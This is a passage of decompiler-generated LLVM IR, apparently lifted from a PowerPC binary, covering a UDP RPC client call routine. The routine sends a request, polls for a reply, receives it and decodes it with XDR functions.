  %v2_10011da4 = ptrtoint i32* %stack_var_-9036 to i32
  %v2_10011dac = ptrtoint i32* %stack_var_-9064 to i32
  %v2_10011c70 = ptrtoint i32* %stack_var_-8900 to i32
  %v2_10011c78 = ptrtoint i16* %stack_var_-9020 to i32
  %v2_10011b4c = ptrtoint i32* %stack_var_-9044 to i32
  %v2_10011bb4 = ptrtoint i32* %stack_var_-8980 to i32
  %tmp83 = urem i16 %tmp43, 2
  %v1_10011b94 = zext i16 %tmp83 to i32
  %v3_10011b94 = icmp eq i16 %tmp83, 0
  %v2_10011e08 = ptrtoint i32* %stack_var_-9004 to i32
  %v2_10011e1c = ptrtoint i32* %stack_var_-8948 to i32
  br label %dec_label_pc_100119f0

dec_label_pc_100119f0:                            ; preds = %dec_label_pc_10011ecc, %dec_label_pc_100119e0
  %v1_10011a04 = phi i32 [ %v0_100119f4.pre, %dec_label_pc_10011ecc ], [ %v3_1001196c, %dec_label_pc_100119e0 ]
  %v0_100119f0 = phi i32 [ %v0_100119f0.pre, %dec_label_pc_10011ecc ], [ %arg3, %dec_label_pc_100119e0 ]
  %v3_100119f0 = icmp eq i32 %v0_100119f0, 0
  %v1_100119f4 = add i32 %v1_10011a04, 56
  store i32 %v1_100119f4, i32* @r26, align 4
  br i1 %v3_100119f0, label %dec_label_pc_10011ae0, label %dec_label_pc_100119fc

dec_label_pc_100119fc:                            ; preds = %dec_label_pc_100119f0
  %v1_10011a00 = add i32 %v1_10011a04, 60
  %v2_10011a00 = inttoptr i32 %v1_10011a00 to i32*
  %v3_10011a00 = load i32, i32* %v2_10011a00, align 4
  store i32 %v3_10011a00, i32* %r9.global-to-local, align 4
  %v3_10011a04 = inttoptr i32 %v1_100119f4 to i32*
  store i32 0, i32* %v3_10011a04, align 4
  %v0_10011a08 = load i32, i32* @r26, align 4
  store i32 %v0_10011a08, i32* %r3.global-to-local, align 4
  %v0_10011a10 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011a10 = add i32 %v0_10011a10, 20
  %v2_10011a10 = inttoptr i32 %v1_10011a10 to i32*
  %v3_10011a10 = load i32, i32* %v2_10011a10, align 4
  store i32 %v3_10011a10, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10011a10)
  %v0_10011a1c = load i32, i32* @r30, align 4
  %v1_10011a1c = add i32 %v0_10011a1c, 88
  %v2_10011a1c = inttoptr i32 %v1_10011a1c to i32*
  %v3_10011a1c = load i32, i32* %v2_10011a1c, align 4
  %v0_10011a20 = load i32, i32* @r26, align 4
  store i32 %v0_10011a20, i32* %r3.global-to-local, align 4
  %v1_10011a28 = inttoptr i32 %v3_10011a1c to i32*
  %v2_10011a28 = load i32, i32* %v1_10011a28, align 4
  %v1_10011a2c = add i32 %v2_10011a28, 1
  store i32 %v1_10011a2c, i32* %r9.global-to-local, align 4
  store i32 %v1_10011a2c, i32* %v1_10011a28, align 4
  %v0_10011a34 = load i32, i32* @r26, align 4
  %v1_10011a34 = add i32 %v0_10011a34, 4
  %v2_10011a34 = inttoptr i32 %v1_10011a34 to i32*
  %v3_10011a34 = load i32, i32* %v2_10011a34, align 4
  store i32 %v3_10011a34, i32* %r9.global-to-local, align 4
  %v1_10011a38 = add i32 %v3_10011a34, 4
  %v2_10011a38 = inttoptr i32 %v1_10011a38 to i32*
  %v3_10011a38 = load i32, i32* %v2_10011a38, align 4
  store i32 %v3_10011a38, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10011a38)
  %v0_10011a44 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011a44 = icmp eq i32 %v0_10011a44, 0
  br i1 %v3_10011a44, label %dec_label_pc_10011a88, label %dec_label_pc_10011a4c

dec_label_pc_10011a4c:                            ; preds = %dec_label_pc_100119fc
  %v0_10011a4c = load i32, i32* %r23.global-to-local, align 4
  %v1_10011a4c = inttoptr i32 %v0_10011a4c to i32*
  %v2_10011a4c = load i32, i32* %v1_10011a4c, align 4
  store i32 %v2_10011a4c, i32* %r3.global-to-local, align 4
  %v1_10011a54 = add i32 %v2_10011a4c, 32
  %v2_10011a54 = inttoptr i32 %v1_10011a54 to i32*
  %v3_10011a54 = load i32, i32* %v2_10011a54, align 4
  store i32 %v3_10011a54, i32* %r9.global-to-local, align 4
  %v1_10011a58 = add i32 %v3_10011a54, 4
  %v2_10011a58 = inttoptr i32 %v1_10011a58 to i32*
  %v3_10011a58 = load i32, i32* %v2_10011a58, align 4
  store i32 %v3_10011a58, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10011a58)
  %v0_10011a64 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011a64 = icmp eq i32 %v0_10011a64, 0
  br i1 %v3_10011a64, label %dec_label_pc_10011a88, label %dec_label_pc_10011a6c

dec_label_pc_10011a6c:                            ; preds = %dec_label_pc_10011a4c
  %v0_10011a6c = load i32, i32* @r26, align 4
  store i32 %v0_10011a6c, i32* %r3.global-to-local, align 4
  %v0_10011a74 = load i32, i32* %r20.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10011a74)
  %v0_10011a80 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011a80 = icmp eq i32 %v0_10011a80, 0
  br i1 %v3_10011a80, label %dec_label_pc_10011a88, label %dec_label_pc_10011a94

dec_label_pc_10011a88:                            ; preds = %dec_label_pc_10011a6c, %dec_label_pc_10011a4c, %dec_label_pc_100119fc
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011c38

dec_label_pc_10011a94:                            ; preds = %dec_label_pc_10011a6c
  %v0_10011a94 = load i32, i32* @r26, align 4
  %v1_10011a94 = add i32 %v0_10011a94, 4
  %v2_10011a94 = inttoptr i32 %v1_10011a94 to i32*
  %v3_10011a94 = load i32, i32* %v2_10011a94, align 4
  store i32 %v3_10011a94, i32* %r9.global-to-local, align 4
  store i32 %v0_10011a94, i32* %r3.global-to-local, align 4
  %v1_10011a9c = add i32 %v3_10011a94, 16
  %v2_10011a9c = inttoptr i32 %v1_10011a9c to i32*
  %v3_10011a9c = load i32, i32* %v2_10011a9c, align 4
  store i32 %v3_10011a9c, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10011a9c)
  %v0_10011aa8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10011aa8, i32* %r19.global-to-local, align 4
  %v0_10011aac.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011aac

dec_label_pc_10011aac:                            ; preds = %dec_label_pc_10011c28, %dec_label_pc_10011c1c, %dec_label_pc_10011a94
  %v0_10011abc = phi i32 [ %v0_10011bd4, %dec_label_pc_10011c28 ], [ %v0_10011bd4, %dec_label_pc_10011c1c ], [ %v0_10011aac.pre, %dec_label_pc_10011a94 ]
  %v1_10011aac = inttoptr i32 %v0_10011abc to i32*
  %v2_10011aac = load i32, i32* %v1_10011aac, align 4
  store i32 %v2_10011aac, i32* %r3.global-to-local, align 4
  %v0_10011ab0 = load i32, i32* %r19.global-to-local, align 4
  %v1_10011ab4 = add i32 %v0_10011abc, 88
  %v2_10011ab4 = inttoptr i32 %v1_10011ab4 to i32*
  %v3_10011ab4 = load i32, i32* %v2_10011ab4, align 4
  %v1_10011abc = add i32 %v0_10011abc, 24
  %v2_10011abc = inttoptr i32 %v1_10011abc to i32*
  %v3_10011abc = load i32, i32* %v2_10011abc, align 4
  %v1_10011ac0 = add i32 %v0_10011abc, 8
  store i32 268507848, i32* @lr, align 4
  %v6_10011ac4 = call i32 @__libc_sendto(i32 %v2_10011aac, i32 %v3_10011ab4, i32 %v0_10011ab0, i32 0, i32 %v1_10011ac0, i32 %v3_10011abc)
  store i32 %v6_10011ac4, i32* %r3.global-to-local, align 4
  %v1_10011ac8 = load i32, i32* %r19.global-to-local, align 4
  %v4_10011ac8 = icmp eq i32 %v6_10011ac4, %v1_10011ac8
  br i1 %v4_10011ac8, label %dec_label_pc_10011ad0, label %dec_label_pc_100119ac

dec_label_pc_10011ad0:                            ; preds = %dec_label_pc_10011aac
  %v0_10011ad0 = load i32, i32* %r21.global-to-local, align 4
  %v3_10011ad0 = icmp eq i32 %v0_10011ad0, 0
  br i1 %v3_10011ad0, label %dec_label_pc_10011ad8, label %dec_label_pc_10011ae0

dec_label_pc_10011ad8:                            ; preds = %dec_label_pc_10011ad0
  %v0_10011ad8 = load i32, i32* %r22.global-to-local, align 4
  %v3_10011ad8 = icmp eq i32 %v0_10011ad8, 0
  br i1 %v3_10011ad8, label %dec_label_pc_10011c30, label %dec_label_pc_10011ae0

dec_label_pc_10011ae0:                            ; preds = %dec_label_pc_10011ad0, %dec_label_pc_10011ad8, %dec_label_pc_100119f0
  store i32 ptrtoint (i32* @global_var_10033c00.494 to i32), i32* %r9.global-to-local, align 4
  %v0_10011b04 = load i32, i32* @r30, align 4
  %v1_10011b04 = inttoptr i32 %v0_10011b04 to i32*
  %v2_10011b04 = load i32, i32* %v1_10011b04, align 4
  store i32 %v2_10011b04, i32* %r9.global-to-local, align 4
  store i32 %v2_10011b04, i32* %stack_var_-9060, align 4
  br label %dec_label_pc_10011b10

dec_label_pc_10011b10:                            ; preds = %dec_label_pc_10011c40, %dec_label_pc_10011df4, %dec_label_pc_10011de4, %dec_label_pc_10011ddc, %dec_label_pc_10011ae0
  store i32 %v2_10011b10, i32* %r3.global-to-local, align 4
  %v0_10011b18 = load i32, i32* %r16.global-to-local, align 4
  store i32 268507936, i32* @lr, align 4
  %v3_10011b1c = call i32 @__libc_poll(i32 %v2_10011b10, i32 1, i32 %v0_10011b18)
  store i32 %v3_10011b1c, i32* %r3.global-to-local, align 4
  %v3_10011b20 = icmp eq i32 %v3_10011b1c, -1
  br i1 %v3_10011b20, label %dec_label_pc_10011c40, label %dec_label_pc_10011b28

dec_label_pc_10011b28:                            ; preds = %dec_label_pc_10011b10
  %v3_10011b28 = icmp eq i32 %v3_10011b1c, 0
  br i1 %v3_10011b28, label %dec_label_pc_10011b30, label %dec_label_pc_10011c50

dec_label_pc_10011b30:                            ; preds = %dec_label_pc_10011b28
  %v0_10011b30 = load i32, i32* @r30, align 4
  %v1_10011b30 = inttoptr i32 %v0_10011b30 to i32*
  %v2_10011b30 = load i32, i32* %v1_10011b30, align 4
  store i32 %v2_10011b30, i32* %r25.global-to-local, align 4
  store i32 8800, i32* %stack_var_-9044, align 4
  store i32 %v2_10011b30, i32* %r3.global-to-local, align 4
  store i32 268507996, i32* @lr, align 4
  %v3_10011b58 = call i32 @ioctl(i32 %v2_10011b30, i32 35090, i32 %v2_10011b4c)
  store i32 %v3_10011b58, i32* %r3.global-to-local, align 4
  %v3_10011b5c = icmp eq i32 %v3_10011b58, 0
  br i1 %v3_10011b5c, label %dec_label_pc_10011b64, label %dec_label_pc_10011bc8

dec_label_pc_10011b64:                            ; preds = %dec_label_pc_10011b30
  %v3_10011b64 = load i32, i32* %stack_var_-9044, align 4
  store i32 %v2_10011c70, i32* @r29, align 4
  %v1_10011b6c = udiv i32 %v3_10011b64, 32
  %tmp84 = icmp ugt i32 %v3_10011b64, 31
  %v0_10011bbc79 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10011bbc79, i32* %r3.global-to-local, align 4
  %v1_10011bc080 = add nsw i32 %v1_10011b6c, -1
  store i32 %v1_10011bc080, i32* @r28, align 4
  br i1 %tmp84, label %dec_label_pc_10011b74, label %dec_label_pc_10011bc8

dec_label_pc_10011b74:                            ; preds = %dec_label_pc_10011b64, %dec_label_pc_10011ba8
  %v0_10011bbc81 = phi i32 [ %v0_10011bbc, %dec_label_pc_10011ba8 ], [ %v0_10011bbc79, %dec_label_pc_10011b64 ]
  store i32 268508040, i32* @lr, align 4
  %v3_10011b84 = call i32 @ioctl(i32 %v0_10011bbc81, i32 35091, i32 %v2_10011bb4)
  store i32 %v3_10011b84, i32* %r3.global-to-local, align 4
  %v1_10011b88 = icmp slt i32 %v3_10011b84, 0
  br i1 %v1_10011b88, label %dec_label_pc_10011bc8, label %dec_label_pc_10011b90

dec_label_pc_10011b90:                            ; preds = %dec_label_pc_10011b74
  store i32 %v1_10011b94, i32* %r9.global-to-local, align 4
  %v0_10011ba8.pre = load i32, i32* @r29, align 4
  br i1 %v3_10011b94, label %dec_label_pc_10011ba8, label %dec_label_pc_10011b9c

dec_label_pc_10011b9c:                            ; preds = %dec_label_pc_10011b90
  %v1_10011b9c = add i32 %v0_10011ba8.pre, 16
  %v2_10011b9c = inttoptr i32 %v1_10011b9c to i16*
  %v3_10011b9c = load i16, i16* %v2_10011b9c, align 2
  %v3_10011ba0 = icmp eq i16 %v3_10011b9c, 2
  br i1 %v3_10011ba0, label %dec_label_pc_10011bd4, label %dec_label_pc_10011ba8

dec_label_pc_10011ba8:                            ; preds = %dec_label_pc_10011b90, %dec_label_pc_10011b9c
  %v1_10011ba8 = add i32 %v0_10011ba8.pre, 32
  store i32 %v1_10011ba8, i32* @r29, align 4
  %v0_10011bac.pre = load i32, i32* @r28, align 4
  %v2_10011bac = icmp sgt i32 %v0_10011bac.pre, 0
  %v0_10011bbc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10011bbc, i32* %r3.global-to-local, align 4
  %v1_10011bc0 = add i32 %v0_10011bac.pre, -1
  store i32 %v1_10011bc0, i32* @r28, align 4
  br i1 %v2_10011bac, label %dec_label_pc_10011b74, label %dec_label_pc_10011bc8

dec_label_pc_10011bc8:                            ; preds = %dec_label_pc_10011b30, %dec_label_pc_10011b64, %dec_label_pc_10011ba8, %dec_label_pc_10011b74
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011c38

dec_label_pc_10011bd4:                            ; preds = %dec_label_pc_10011b9c
  %v0_10011bd4 = load i32, i32* @r30, align 4
  %v1_10011bd4 = add i32 %v0_10011bd4, 32
  %v2_10011bd4 = inttoptr i32 %v1_10011bd4 to i32*
  %v3_10011bd4 = load i32, i32* %v2_10011bd4, align 4
  store i32 1000000, i32* %r9.global-to-local, align 4
  %v0_10011be0 = load i32, i32* %r24.global-to-local, align 4
  %v2_10011be0 = add i32 %v0_10011be0, %v3_10011bd4
  store i32 %v2_10011be0, i32* %r24.global-to-local, align 4
  %v1_10011be4 = add i32 %v0_10011bd4, 28
  %v2_10011be4 = inttoptr i32 %v1_10011be4 to i32*
  %v3_10011be4 = load i32, i32* %v2_10011be4, align 4
  %v2_10011be8 = udiv i32 %v2_10011be0, 1000000
  %v0_10011bf0 = load i32, i32* %r18.global-to-local, align 4
  %v2_10011bf0 = add i32 %v0_10011bf0, %v3_10011be4
  store i32 %v2_10011bf0, i32* %r18.global-to-local, align 4
  %v1_10011bf4 = add nuw nsw i32 %v2_10011be8, 1
  store i32 %v1_10011bf4, i32* %r9.global-to-local, align 4
  %tmp65 = icmp sgt i32 %v2_10011be0, -1
  br i1 %tmp65, label %dec_label_pc_10011c14.preheader, label %dec_label_pc_10011c14.preheader.thread

dec_label_pc_10011c14.preheader.thread:           ; preds = %dec_label_pc_10011bd4
  %v1_10011c141230 = add i32 %v2_10011be0, -983040
  store i32 %v1_10011c141230, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10011c1c

dec_label_pc_10011c14.preheader:                  ; preds = %dec_label_pc_10011bd4
  %v1_10011c1412 = add i32 %v2_10011be0, -983040
  store i32 %v1_10011c1412, i32* %r9.global-to-local, align 4
  %tmp66 = icmp ult i32 %v2_10011be0, 1000000
  br i1 %tmp66, label %dec_label_pc_10011c1c, label %dec_label_pc_10011c0c.lr.ph

dec_label_pc_10011c0c.lr.ph:                      ; preds = %dec_label_pc_10011c14.preheader
  %tmp67 = mul i32 %v2_10011be8, 1000000
  %tmp68 = add i32 %v2_10011bf0, %v2_10011be8
  %tmp71 = sub i32 %v1_10011c1412, %tmp67
  %v1_10011c10 = sub i32 %v2_10011be0, %tmp67
  store i32 %tmp68, i32* %r18.global-to-local, align 4
  store i32 %tmp71, i32* %r9.global-to-local, align 4
  store i32 %v1_10011c10, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_10011c1c

dec_label_pc_10011c1c:                            ; preds = %dec_label_pc_10011c14.preheader.thread, %dec_label_pc_10011c0c.lr.ph, %dec_label_pc_10011c14.preheader
  %v0_10011c28 = phi i32 [ %v1_10011c10, %dec_label_pc_10011c0c.lr.ph ], [ %v2_10011be0, %dec_label_pc_10011c14.preheader ], [ %v2_10011be0, %dec_label_pc_10011c14.preheader.thread ]
  %v0_10011c1c.lcssa = phi i32 [ %tmp68, %dec_label_pc_10011c0c.lr.ph ], [ %v2_10011bf0, %dec_label_pc_10011c14.preheader ], [ %v2_10011bf0, %dec_label_pc_10011c14.preheader.thread ]
  %v1_10011c1c = load i32, i32* %r21.global-to-local, align 4
  %v2_10011c1c = icmp slt i32 %v0_10011c1c.lcssa, %v1_10011c1c
  br i1 %v2_10011c1c, label %dec_label_pc_10011aac, label %dec_label_pc_10011c24

dec_label_pc_10011c24:                            ; preds = %dec_label_pc_10011c1c
  %v4_10011c1c = icmp eq i32 %v0_10011c1c.lcssa, %v1_10011c1c
  br i1 %v4_10011c1c, label %dec_label_pc_10011c28, label %dec_label_pc_10011c30

dec_label_pc_10011c28:                            ; preds = %dec_label_pc_10011c24
  %v1_10011c28 = load i32, i32* %r22.global-to-local, align 4
  %v2_10011c28 = icmp slt i32 %v0_10011c28, %v1_10011c28
  br i1 %v2_10011c28, label %dec_label_pc_10011aac, label %dec_label_pc_10011c30

dec_label_pc_10011c30:                            ; preds = %dec_label_pc_10011c24, %dec_label_pc_10011c28, %dec_label_pc_10011ad8
  store i32 5, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011c38

dec_label_pc_10011c38:                            ; preds = %dec_label_pc_10011bc8, %dec_label_pc_10011a88, %dec_label_pc_10011c30
  %v0_10011c38 = phi i32 [ 4, %dec_label_pc_10011bc8 ], [ 1, %dec_label_pc_10011a88 ], [ 5, %dec_label_pc_10011c30 ]
  %v1_10011c38 = load i32, i32* @r30, align 4
  %v2_10011c38 = add i32 %v1_10011c38, 44
  %v3_10011c38 = inttoptr i32 %v2_10011c38 to i32*
  store i32 %v0_10011c38, i32* %v3_10011c38, align 4
  br label %dec_label_pc_10011ee0

dec_label_pc_10011c40:                            ; preds = %dec_label_pc_10011b10
  %v0_10011c40 = call i32 @__errno_location()
  store i32 %v0_10011c40, i32* %r3.global-to-local, align 4
  %v1_10011c44 = inttoptr i32 %v0_10011c40 to i32*
  %v2_10011c44 = load i32, i32* %v1_10011c44, align 4
  store i32 %v2_10011c44, i32* %r9.global-to-local, align 4
  %v3_10011c48 = icmp eq i32 %v2_10011c44, 4
  br i1 %v3_10011c48, label %dec_label_pc_10011b10, label %dec_label_pc_100119c4

dec_label_pc_10011c50:                            ; preds = %dec_label_pc_10011b28
  store i32 %v1_10011c54, i32* %r9.global-to-local, align 4
  br i1 %v3_10011c54, label %dec_label_pc_10011d90, label %dec_label_pc_10011c5c

dec_label_pc_10011c5c:                            ; preds = %dec_label_pc_10011c50
  %v0_10011c5c = load i32, i32* %r19.global-to-local, align 4
  %v1_10011c5c = add i32 %v0_10011c5c, 286
  %v2_10011c60 = load i32, i32* %stack_var_-9072, align 4
  store i32 %v2_10011c60, i32* %r9.global-to-local, align 4
  %v1_10011c64 = call i32 @__asm_rlwinm(i32 %v1_10011c5c, i32 0, i32 0, i32 27)
  %v0_10011c74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011c74 = load i32, i32* @r1, align 4
  %v3_10011c74 = sub i32 %v1_10011c74, %v1_10011c64
  %v4_10011c74 = inttoptr i32 %v3_10011c74 to i32*
  store i32 %v0_10011c74, i32* %v4_10011c74, align 4
  store i32 %v2_10011c78, i32* %stack_var_-8900, align 4
  %v1_10011c90 = add i32 %v3_10011c74, 23
  store i32 %v1_10011c90, i32* %r9.global-to-local, align 4
  %v1_10011c98 = call i32 @__asm_rlwinm(i32 %v1_10011c90, i32 0, i32 0, i32 27)
  store i32 %v1_10011c98, i32* %r9.global-to-local, align 4
  %v1_10011ca8 = add i32 %v1_10011c98, 256
  store i32 %v1_10011ca8, i32* %r28.global-to-local, align 4
  %v0_10011cc0 = load i32, i32* @r30, align 4
  %v1_10011cc0 = inttoptr i32 %v0_10011cc0 to i32*
  %v2_10011cc0 = load i32, i32* %v1_10011cc0, align 4
  store i32 %v2_10011cc0, i32* %r3.global-to-local, align 4
  store i32 268508360, i32* @lr, align 4
  %v3_10011cc4 = call i32 @__libc_recvmsg(i32 %v2_10011cc0, i32 8192, i32 8192)
  store i32 %v3_10011cc4, i32* %r3.global-to-local, align 4
  %v1_10011cc8 = icmp slt i32 %v3_10011cc4, 0
  br i1 %v1_10011cc8, label %dec_label_pc_10011d90, label %dec_label_pc_10011cd0

dec_label_pc_10011cd0:                            ; preds = %dec_label_pc_10011c5c
  %v0_10011cd0 = load i32, i32* @r30, align 4
  %v1_10011cd0 = add i32 %v0_10011cd0, 88
  %v2_10011cd0 = inttoptr i32 %v1_10011cd0 to i32*
  %v3_10011cd0 = load i32, i32* %v2_10011cd0, align 4
  store i32 %v3_10011cd0, i32* @r4, align 4
  %v0_10011cd4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10011cd4, i32* @r3, align 4
  %v3_10011cdc = call i32 @bcmp(i32 %v0_10011cd4, i32 %v3_10011cd0, i32 %v3_10011cc4)
  store i32 %v3_10011cdc, i32* %r3.global-to-local, align 4
  %v3_10011ce0 = icmp eq i32 %v3_10011cdc, 0
  br i1 %v3_10011ce0, label %dec_label_pc_10011ce8, label %dec_label_pc_10011d90

dec_label_pc_10011ce8:                            ; preds = %dec_label_pc_10011cd0
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10011d90

dec_label_pc_10011d90:                            ; preds = %dec_label_pc_10011ce8, %dec_label_pc_10011cd0, %dec_label_pc_10011c5c, %dec_label_pc_10011c50, %dec_label_pc_10011dc0
  %v0_10011d94 = load i32, i32* @r30, align 4
  %v1_10011d94 = add i32 %v0_10011d94, 96
  store i32 %v1_10011d94, i32* %r28.global-to-local, align 4
  store i32 16, i32* %stack_var_-9064, align 4
  %v1_10011da8 = add i32 %v0_10011d94, 92
  %v2_10011da8 = inttoptr i32 %v1_10011da8 to i32*
  %v3_10011da8 = load i32, i32* %v2_10011da8, align 4
  %v1_10011db0 = inttoptr i32 %v0_10011d94 to i32*
  %v2_10011db0 = load i32, i32* %v1_10011db0, align 4
  store i32 %v2_10011db0, i32* %r3.global-to-local, align 4
  store i32 268508600, i32* @lr, align 4
  %v6_10011db4 = call i32 @__libc_recvfrom(i32 %v2_10011db0, i32 %v1_10011d94, i32 %v3_10011da8, i32 0, i32 %v2_10011da4, i32 %v2_10011dac)
  store i32 %v6_10011db4, i32* %r3.global-to-local, align 4
  %tmp72 = icmp sgt i32 %v6_10011db4, -1
  br i1 %tmp72, label %dec_label_pc_10011de4, label %dec_label_pc_10011dc0

dec_label_pc_10011dc0:                            ; preds = %dec_label_pc_10011d90
  %v0_10011dc0 = call i32 @__errno_location()
  store i32 %v0_10011dc0, i32* %r3.global-to-local, align 4
  %v1_10011dc4 = inttoptr i32 %v0_10011dc0 to i32*
  %v2_10011dc4 = load i32, i32* %v1_10011dc4, align 4
  %v3_10011dc8 = icmp eq i32 %v2_10011dc4, 4
  br i1 %v3_10011dc8, label %dec_label_pc_10011d90, label %dec_label_pc_10011ddc

dec_label_pc_10011ddc:                            ; preds = %dec_label_pc_10011dc0
  %v0_10011dd0 = call i32 @__errno_location()
  store i32 %v0_10011dd0, i32* %r3.global-to-local, align 4
  %v1_10011dd4 = inttoptr i32 %v0_10011dd0 to i32*
  %v2_10011dd4 = load i32, i32* %v1_10011dd4, align 4
  store i32 %v2_10011dd4, i32* %r9.global-to-local, align 4
  %v3_10011dd8 = icmp eq i32 %v2_10011dd4, 11
  br i1 %v3_10011dd8, label %dec_label_pc_10011b10, label %dec_label_pc_100119c4

dec_label_pc_10011de4:                            ; preds = %dec_label_pc_10011d90
  %tmp73 = icmp slt i32 %v6_10011db4, 4
  br i1 %tmp73, label %dec_label_pc_10011b10, label %dec_label_pc_10011dec

dec_label_pc_10011dec:                            ; preds = %dec_label_pc_10011de4
  %v0_10011dec = load i32, i32* %r20.global-to-local, align 4
  %v3_10011dec = icmp eq i32 %v0_10011dec, 0
  br i1 %v3_10011dec, label %dec_label_pc_10011e08, label %dec_label_pc_10011df4

dec_label_pc_10011df4:                            ; preds = %dec_label_pc_10011dec
  %v0_10011df4 = load i32, i32* @r30, align 4
  %v1_10011df4 = add i32 %v0_10011df4, 88
  %v2_10011df4 = inttoptr i32 %v1_10011df4 to i32*
  %v3_10011df4 = load i32, i32* %v2_10011df4, align 4
  store i32 %v3_10011df4, i32* %r9.global-to-local, align 4
  %v1_10011df8 = add i32 %v0_10011df4, 96
  %v2_10011df8 = inttoptr i32 %v1_10011df8 to i32*
  %v3_10011df8 = load i32, i32* %v2_10011df8, align 4
  %v1_10011dfc = inttoptr i32 %v3_10011df4 to i32*
  %v2_10011dfc = load i32, i32* %v1_10011dfc, align 4
  %v4_10011e00 = icmp eq i32 %v3_10011df8, %v2_10011dfc
  br i1 %v4_10011e00, label %dec_label_pc_10011e08, label %dec_label_pc_10011b10

dec_label_pc_10011e08:                            ; preds = %dec_label_pc_10011df4, %dec_label_pc_10011dec
  %v0_10011e0c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v2_10011e08, i32* %r3.global-to-local, align 4
  store i32 %v2_10011e1c, i32* %r28.global-to-local, align 4
  %v5_10011e20 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-9004, i32 %v0_10011e0c, i32 %v6_10011db4, i32 1)
  store i32 %v2_10011e08, i32* %r3.global-to-local, align 4
  store i32 268508720, i32* @lr, align 4
  %v2_10011e2c = call i32 @__GI_xdr_replymsg(i32 %v2_10011e08, i32 %v2_10011e1c)
  store i32 %v2_10011e2c, i32* %r3.global-to-local, align 4
  %v3_10011e30 = icmp eq i32 %v2_10011e2c, 0
  br i1 %v3_10011e30, label %dec_label_pc_10011ed4, label %dec_label_pc_10011e38

dec_label_pc_10011e38:                            ; preds = %dec_label_pc_10011e08
  store i32 %v2_10011e1c, i32* %r3.global-to-local, align 4
  %v0_10011e3c = load i32, i32* @r30, align 4
  %v1_10011e3c = add i32 %v0_10011e3c, 44
  store i32 268508740, i32* @lr, align 4
  %v2_10011e40 = inttoptr i32 %v1_10011e3c to i32*
  %v3_10011e40 = call i32 @__GI__seterr_reply(i32 %v2_10011e1c, i32* %v2_10011e40)
  store i32 %v3_10011e40, i32* %r3.global-to-local, align 4
  %v0_10011e44 = load i32, i32* @r30, align 4
  %v1_10011e44 = add i32 %v0_10011e44, 44
  %v2_10011e44 = inttoptr i32 %v1_10011e44 to i32*
  %v3_10011e44 = load i32, i32* %v2_10011e44, align 4
  %v3_10011e48 = icmp eq i32 %v3_10011e44, 0
  br i1 %v3_10011e48, label %dec_label_pc_10011e50, label %dec_label_pc_10011ea8

dec_label_pc_10011e50:                            ; preds = %dec_label_pc_10011e38
  %v0_10011e50 = load i32, i32* %r23.global-to-local, align 4
  %v1_10011e50 = inttoptr i32 %v0_10011e50 to i32*
  %v2_10011e50 = load i32, i32* %v1_10011e50, align 4
  store i32 %v2_10011e50, i32* %r3.global-to-local, align 4
  %v1_10011e5c = add i32 %v2_10011e50, 32
  %v2_10011e5c = inttoptr i32 %v1_10011e5c to i32*
  %v3_10011e5c = load i32, i32* %v2_10011e5c, align 4
  store i32 %v3_10011e5c, i32* %r9.global-to-local, align 4
  %v1_10011e60 = add i32 %v3_10011e5c, 8
  %v2_10011e60 = inttoptr i32 %v1_10011e60 to i32*
  %v3_10011e60 = load i32, i32* %v2_10011e60, align 4
  store i32 %v3_10011e60, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10011e60)
  %v0_10011e6c = load i32, i32* %r3.global-to-local, align 4
  %v3_10011e6c = icmp eq i32 %v0_10011e6c, 0
  br i1 %v3_10011e6c, label %dec_label_pc_10011e74, label %dec_label_pc_10011e84

dec_label_pc_10011e74:                            ; preds = %dec_label_pc_10011e50
  %v1_10011e78 = load i32, i32* @r30, align 4
  %v2_10011e78 = add i32 %v1_10011e78, 44
  %v3_10011e78 = inttoptr i32 %v2_10011e78 to i32*
  store i32 7, i32* %v3_10011e78, align 4
  %v1_10011e80 = load i32, i32* @r30, align 4
  %v2_10011e80 = add i32 %v1_10011e80, 48
  %v3_10011e80 = inttoptr i32 %v2_10011e80 to i32*
  store i32 6, i32* %v3_10011e80, align 4
  br label %dec_label_pc_10011e84

dec_label_pc_10011e84:                            ; preds = %dec_label_pc_10011e50, %dec_label_pc_10011e74
  %v3_10011e88 = icmp eq i32 %tmp33, 0
  br i1 %v3_10011e88, label %dec_label_pc_10011edc, label %dec_label_pc_10011e90

dec_label_pc_10011e90:                            ; preds = %dec_label_pc_10011e84
  %v0_10011e94 = load i32, i32* @r26, align 4
  store i32 %v0_10011e94, i32* @r3, align 4
  %v2_10011e98 = inttoptr i32 %v0_10011e94 to i32*
  store i32 2, i32* %v2_10011e98, align 4
  store i32 %v2_10011ae4, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10011ea4.495 to i32), i32* @lr, align 4
  %v0_10011ea0 = call i32 @xdr_opaque_auth()
  store i32 %v0_10011ea0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011edc

dec_label_pc_10011ea8:                            ; preds = %dec_label_pc_10011e38
  %v0_10011ea8 = load i32, i32* %r17.global-to-local, align 4
  %tmp74 = icmp slt i32 %v0_10011ea8, 1
  br i1 %tmp74, label %dec_label_pc_10011edc, label %dec_label_pc_10011eb0

dec_label_pc_10011eb0:                            ; preds = %dec_label_pc_10011ea8
